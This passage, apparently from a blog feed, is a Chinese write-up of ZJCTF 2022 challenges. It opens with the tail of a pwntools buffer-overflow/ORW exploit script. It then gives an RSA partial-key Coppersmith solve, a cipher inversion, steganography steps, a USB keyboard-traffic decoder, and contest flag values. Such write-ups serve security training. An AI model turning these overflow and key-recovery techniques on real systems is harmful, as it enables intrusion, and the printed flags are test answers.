class="comment">#pa+=p64(pop_rdx)+p64(0x100)+p64(syscall)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x4017cc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x178</span>+p64(buf+<span class="number">0x300</span>)+pa)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)<span class="comment">#orw链</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><p>赛时截图：</p><p><img src="/2022/09/24/ZJCTF-2022/5.png" alt="5"></p><p>不管怎么说，这题拿到了一个一血，还是很开心的，但是据说这题有更简单的做法，因为程序运行的时候会分配一个可读可写可执行的段，而我们可以利用这个段写 shellcode 去得到 flag，而 pwntools 自带构造 shellcode 的函数，可以让我们方便去构造 shellcode。</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="zandroid"><a href="#zandroid" class="headerlink" title="zandroid"></a>zandroid</h2><p>zip打开，找资源文件发现直接 flag 在 mipmap-xxxhpdi-v4 下面有一个 pic1.png 上面画着 flag。</p><p>我的 re 什么时候才能站起来啊，听说这次 re 异常简单，而我就是不会。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rssssa5"><a href="#rssssa5" class="headerlink" title="rssssa5"></a>rssssa5</h2><p>用sagemath跑下面的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">21795945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747177248724184844583697034436178042499504967917978621708536213230969406811902366917932032050583747070735750876593573387957847683066895725722366706359818941065483471789173682177234707645138490589285500875222568286917243861325846262174331736570517513524474322519145470883352586121892275861245291051789531734179640139953079522307426687782419075644619898733819937782418589025945603603989100805717550707637938272890461763518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533</span></span><br><span class="line">c = <span class="number">1700765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641712525534203652911807047718681392766077895625388064095459224402032253429117181743725938853591119977172518617563668740574496233135226296439754690903570240135657268737729817911404733486976376064060345507410817912670147466261149172470191719474107592103882894806322239740349433710606063058170148571050855845964674224651003832579701204330217602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664</span></span><br><span class="line">p = <span class="number">1426723861968217959675536598409491243380171101180592446441749834738176786277745723654950385796320682900434611832789544257790278878742420696344225394624591757752431494779</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">k=x*<span class="number">2</span>**<span class="number">560</span>+p</span><br><span class="line">k=k.monic()</span><br><span class="line"></span><br><span class="line">root = k.small_roots(X=<span class="number">2</span>^<span class="number">464</span>,beta=<span class="number">0.45</span>,epsilon=<span class="number">0.05</span>)</span><br><span class="line">p=<span class="built_in">int</span> (root[<span class="number">0</span>])*<span class="number">2</span>**<span class="number">560</span>+p</span><br><span class="line"></span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2022/09/24/ZJCTF-2022/6.png" alt="6"></p><p>然后解下hex即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;ce73935b2e83a78aa5079a9e59ae4980&#125;</span><br></pre></td></tr></table></figure><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>思路大概就是对每一个操作求逆，直接跑个脚本完事</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span></span><br><span class="line">n=<span class="number">176778040837484895481963794918312894811914463587783883976856801776290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726175605877196383212378074705385178610178824713173854530726380795438083708575717562524587045312909657881223522830729052758566504582290081411726333</span></span><br><span class="line">m=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key=n-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    k=((<span class="built_in">str</span>.index(i)-<span class="number">7</span>)*inverse(key,<span class="number">37</span>))%<span class="number">37</span></span><br><span class="line">    m+=<span class="built_in">str</span>[k]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2022/09/24/ZJCTF-2022/7.png" alt="7"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>拿到发现是两张图片整合而成的，分离图片时发现中间有一串gift，刚开始以为是base64，怎么试都还是错的，后来才发现不是，最后拿去解码拿到flag</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_12-47-06.png" alt="Snipaste_2022-09-24_12-47-06"></p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_10-09-08.png" alt="Snipaste_2022-09-24_10-09-08"></p><h2 id="m4a"><a href="#m4a" class="headerlink" title="m4a"></a>m4a</h2><p>拿到一个没有后缀的文件</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_12-52-16.png" alt="Snipaste_2022-09-24_12-52-16"></p><p>拖入010发现文件末尾有疑似压缩包关键字</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-25-37.png" alt="Snipaste_2022-09-24_13-25-37"></p><p>但是好像是倒着的，用瑞士军刀倒回来</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-32-00.png" alt="Snipaste_2022-09-24_13-32-00"></p><p>保存下来准备打开，但是显示损坏</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-33-23.png" alt="Snipaste_2022-09-24_13-33-23"></p><p>用WinRAR修复一下得到一个完整的压缩包</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-49-08.png" alt="Snipaste_2022-09-24_13-49-08"></p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-49-19.png" alt="Snipaste_2022-09-24_13-49-19"></p><p>但是发现解压需要密码，爆破无果，看了一会别的题目回到这个题的时候，发现题目一直在强调m4a的文件类型，在010中反复查看，突然注意到开头的mp，发现文件中有好多个m和p字母出现</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-05-44.png" alt="Snipaste_2022-09-24_14-05-44"></p><p>因为没有很明显的文件头和文件尾，脑洞一开猜想会不会是mp3或者mp4，于是改了个文件尾，发现可以打开（打开的一瞬间吓我一跳、、）</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-08-05.png" alt="Snipaste_2022-09-24_14-08-05"></p><p>正经人当然纯靠耳朵听摩斯密码啦（bushi</p><p>打开Au一顿操作猛如虎</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_10-41-52.jpg" alt="Snipaste_2022-09-24_10-41-52"></p><p>翻译一下</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-10-13.png" alt="Snipaste_2022-09-24_14-10-13"></p><p>解码一下</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-11-42.png" alt="Snipaste_2022-09-24_14-11-42"></p><p>拿到压缩包密码，打开压缩包</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-12-38.png" alt="Snipaste_2022-09-24_14-12-38"></p><p>拿到一串字符，交了一下发现错误，文件名是atbash，在瑞士军刀中搜索发现有此方法，拖入后将得到的字符上交，还是错误。</p><p>试了一下签到题里用过的rot13，还是错误，只能将解密库里的解密一个一个试过去，发现居然是47、、（远在天边近在眼前</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-16-16.png" alt="Snipaste_2022-09-24_14-16-16"></p><p>提交得到flag</p><h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p>拿到一张图片<img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-19-27.png" alt="Snipaste_2022-09-24_14-19-27">打开核对文件头文件尾发现尾端多出一部分</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-22-30.png" alt="Snipaste_2022-09-24_14-22-30"></p><p>把尾端多出来的部分拿去解密</p><p>用base64解密后只能看到前面部分，后面依旧是乱码，但是很有规律，结合做题经验发现是我最讨厌的表情符号</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-31-05.png" alt="Snipaste_2022-09-24_13-31-05"></p><p>然后拿key</p><p>用Stegsolve解码下图片</p><p>504B，明显zip文件</p><p><img src="/2022/09/24/ZJCTF-2022/image-20220924143455373.png"></p><p><img src="/2022/09/24/ZJCTF-2022/image-20220924143531149.png"></p><p>处理下文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;./key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lines=f.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> line[:<span class="built_in">len</span>(line)]:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(s,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;:&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>发现是键盘流量，但是格式不太对，写个脚本添加冒号，核对格式后直接套用大佬的脚本</p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_13-56-16.png" alt="Snipaste_2022-09-24_13-56-16" style="zoom:50%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">              <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">              <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">              <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>,</span><br><span class="line">              <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">              <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">              <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">             <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">             <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">             <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">             <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">             <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;key1.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"> </span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解密</p><p><img src="/2022/09/24/ZJCTF-2022/Snipaste_2022-09-24_14-28-22.png" alt="Snipaste_2022-09-24_14-28-22"></p><p>提交</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;久违的题解来啦！！！&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>CS:APP第三章复习</title>
    <link href="http://example.com/2022/09/22/CSAPP_3/"/>
    <id>http://example.com/2022/09/22/CSAPP_3/</id>
    <published>2022-09-22T11:00:00.000Z</published>
    <updated>2022-09-26T02:05:14.375Z</updated>
    
